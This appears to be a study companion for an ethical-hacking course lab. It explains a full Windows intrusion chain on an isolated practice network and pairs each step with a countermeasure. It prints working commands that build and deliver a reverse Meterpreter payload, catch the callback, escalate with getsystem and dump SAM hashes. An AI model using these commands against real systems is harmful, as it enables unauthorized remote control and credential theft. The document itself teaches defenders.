Overview — what this lab is really teaching

This is the lab where the pieces connect into a full intrusion: find a target, deliver code to it, get it to run, escalate privileges, steal credentials, and maintain access. It's the heart of Module 6: System Hacking.

The reason an ethical-hacking course walks the whole chain is defensive: you cannot recognize an intrusion you've never seen, and you can't justify a control until you've watched the attack it stops. This companion explains what each step does and how it's detected and prevented, rather than how to tune it against a live defense — the understanding is the exam material and the job, the evasion is not.

Isolated range only

This chain runs against a practice VM in a closed pod. Generating and delivering code to a machine you don't own or have written authorization to test is a crime. The skill is legal; the authorization is what makes it ethical.

The environment you're working in

Your attack box is Kali at 192.168.0.2; the victim is a Windows VM in the pod. You'll host a file on Kali's Apache server, catch a connection back in Metasploit, and work inside the resulting session. Everything stays on the private pod network.

The attack chain, explained

Step 1 — Identify the target

1 Recon

root@kali:~# nmap -sn 192.168.0.0/24
root@kali:~# nmap -sSV -O TARGET

Same discovery and fingerprinting as Labs 03 and 20 — find the host, learn its OS and services. (The lab's -sP is the old name for -sn.) You need the OS and architecture because the payload has to match them.

📸 Screenshot for your report

Capture the scan identifying the target's OS and open services.

Step 2 — Choose a payload

2 Reverse vs. bind

A payload is what runs on the victim after your code executes. The lab uses a reverse Meterpreter payload: instead of the attacker connecting to the victim (a bind shell, usually blocked by inbound firewall rules), the victim connects back out to the attacker. Reverse connections work because outbound traffic is usually allowed — which is also the clue to the defense (egress filtering).

Meterpreter, in one line

Meterpreter is an in-memory, feature-rich payload — a remote "toolbox" that runs without writing much to disk, which is part of why it's historically been hard for simple AV to catch and why behavior-based EDR exists.

Step 3 — Generate and host the payload

3 Build it with msfvenom

root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.2 LPORT=4444 -f exe -o payload.exe

msfvenom turns a chosen payload into a deliverable file. -p is the payload, LHOST/LPORT tell the victim where to call back, -f exe is the output format, and -o names the file. That's the whole anatomy.

About the encoder step

The lab also applies an encoder (-e), historically used to disguise payloads from signature-based antivirus. This companion deliberately doesn't walk through evasion tuning, because the honest, exam-relevant point is the opposite: modern EDR detects these payloads by behavior regardless of encoding. Encoders no longer meaningfully evade current defenses — which is exactly why defenders moved to behavior-based detection.

4 Stage it for delivery

root@kali:~# systemctl start apache2

The file goes into Kali's web root so the victim can download it. Getting a user to actually run it is the social-engineering step (Lab 18) — and the reason user training and application control are frontline defenses.

Step 4 — Catch the connection

5 Set up the handler

root@kali:~# sudo msfconsole
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.0.2
msf6 > show options
msf6 > exploit -j -z

The handler is just a listener waiting for the victim's callback — its payload and LHOST/LPORT must match what you put in the file. exploit -j -z runs it as a background job. When the victim runs the file, a session appears.

Step 5 — Post-exploitation

6 Who am I, then escalate

meterpreter > getuid
meterpreter > getsystem

getuid shows the account you landed as. getsystem attempts privilege escalation to the SYSTEM account using known techniques. Whether it succeeds depends entirely on how the box is configured — which is the defensive story: a patched, least-privilege host often says no.

📸 Screenshot for your report

Capture getuid before and after getsystem, showing the privilege change (or that escalation failed).

7 Dump credentials and maintain access

meterpreter > run hashdump

run hashdump reads the Windows account hashes out of the SAM — which only works once you're SYSTEM, and which is the attack Lab 22 studies offline. Uploading a script to re-establish access later is the maintaining access phase. Each of these is a well-known step with a well-known countermeasure (see below) — that pairing is the point.

The defender's view

This is the most important section on the page

Every step of the chain above has a named, practical countermeasure. Read the attack once to understand it; read this list twice.

Attacker stepWhat stops it
Deliver a file to the userSecurity awareness training; email/web filtering; application control / allow-listing so unapproved executables simply don't run.
Payload executesEDR / next-gen AV detecting the payload and Meterpreter behavior — not the encoding.
Reverse callback leaves the networkEgress filtering and proxy inspection — block/scrutinize unexpected outbound connections.
getsystem privilege escalationPatching; running users as non-admin (least privilege); UAC and exploit protections.
hashdump credential theftCredential Guard / LSASS protection; strong, unique passwords; limiting local admin so one host's creds don't unlock others.
Maintaining accessMonitoring for new services/tasks/autoruns; EDR persistence detection; network segmentation to contain the blast radius.
The whole chainLogging and detection — new listeners, odd child processes, LSASS access, and unusual outbound traffic are all observable IOCs.

  • Reverse vs. bind and staged vs. stageless payloads.

Check yourself

1. Why does a reverse payload usually get through a firewall when a bind payload doesn't?

A bind payload needs an inbound connection to the victim, which firewalls usually block. A reverse payload has the victim connect outbound to the attacker, and outbound traffic is typically allowed — which is why egress filtering is the matching defense.

2. Why must getsystem succeed before hashdump works?

Reading the SAM requires SYSTEM-level privileges. Without escalating first, you can't access the credential store.

3. The lab encodes the payload to dodge antivirus. Why is that not the real lesson in 2026?

Modern EDR detects payloads by their behavior, not just a static signature, so encoding no longer reliably evades defenses. The lesson is why behavior-based detection exists.

4. Name two controls that stop the very first step — getting the file to run.

Any two of: application allow-listing, security awareness training, email/web filtering, EDR blocking execution.
